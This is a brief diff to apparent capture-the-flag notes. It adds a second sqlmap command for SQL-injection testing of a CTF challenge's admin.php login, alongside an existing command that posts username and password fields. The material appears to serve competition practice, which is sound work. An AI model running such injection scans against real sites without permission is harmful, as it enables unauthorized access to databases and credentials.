@@ -5,3 +5,7 @@
 (Do not inject inside - N N then Y)
 
     sqlmap https://hackerchess-web.h4ck.ctfcompetition.com/admin.php --data="username=\"xyz\"&password=\"abc\"" -vvv
+
+Or:
+
+    sqlmap -r admin-login.http -p username -vvv
